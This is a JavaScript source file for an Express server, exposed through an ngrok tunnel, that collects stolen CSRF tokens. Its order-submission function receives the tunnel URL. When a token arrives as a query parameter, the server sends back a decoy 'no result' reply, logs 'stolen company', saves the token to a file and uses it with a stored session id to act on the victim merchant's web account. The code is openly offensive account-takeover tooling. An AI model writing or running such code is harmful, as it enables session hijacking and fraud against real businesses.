const ngrok = require("ngrok");
const express = require("express");
const configApp = require("../json/config.json");
const app = express();
const port = 8080;
const sendOrder = require("../app");
const fs = require('fs');
const webApp = require('./webApp');

const fakeReponse = {
  code: 2,
  msg: "Nenhum resultado",
  details: null,
};

app.get("/", (req, res) => {
  if (req.query.v) {
    
    res.send(fakeReponse);
    
    console.log();
    console.log();
    console.log();
    console.log('----------------------------------');
    console.log("  <<<<<< stolen company >>>>>>    ");
    console.log('----------------------------------');
    console.log();
    console.log();
    console.log();


    writeFileJSON('./../json/tokenMerchant.json', `{"YII_CSRF_TOKEN": "${req.query.v}"}`);
    webApp(req.query.v, configApp.phpsessiid);
  } else {
    console.log('erro token na requisição!!');
  }
});

const startServer = () => {
  
  app.listen(port, () => {
    startNGrok();
  });

};

startNGrok = () => {
  ngrok.connect(port).then((url) => {
   
    console.log(`Local server listening on port ${port}  remote url: ===>   ${url}`);

    sendOrder(
      configApp.merchantName,
      configApp.city,
      configApp.bairro,
      configApp.email,
      configApp.pass,
      configApp.categoryProduct,
      configApp.product,
      url
    );

  });
};
 

var writeFileJSON = (fileName, value) => {
  fs.writeFile(fileName, value, function (err) { });
}

module.exports = startServer;
